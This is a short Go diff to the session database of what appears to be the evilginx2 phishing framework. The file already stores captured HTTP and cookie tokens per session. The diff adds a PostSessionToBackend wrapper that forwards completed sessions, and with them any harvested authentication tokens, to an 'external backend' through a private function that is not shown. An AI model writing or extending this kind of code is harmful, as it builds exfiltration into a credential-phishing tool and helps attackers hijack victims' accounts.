@@ -5,6 +5,8 @@ import (
 	"strconv"
 
 	"github.com/tidwall/buntdb"
+	"github.com/kgretzky/evilginx2/log"
+
 )
 
 type Database struct {
@@ -67,6 +69,22 @@ func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) er
 func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
 	err := d.sessionsUpdateCookieTokens(sid, tokens)
 	return err
+}
+
+// PostSessionToBackend sends a completed session to the external backend.
+// It is a thin public wrapper that delegates to the private implementation.
+func (d *Database) PostSessionToBackend(sid string) error {
+    if sid == "" {
+        log.Warning("PostSessionToBackend: sid is empty")
+        return nil // or return an error if you prefer
+    }
+
+    log.Warning("PostSessionToBackend called for sid=%s", sid)
+    err := d.postSessionToBackend(sid)
+    if err != nil {
+        log.Error("PostSessionToBackend: failed for sid=%s: %v", sid, err)
+    }
+    return err
 }
 
 func (d *Database) DeleteSession(sid string) error {
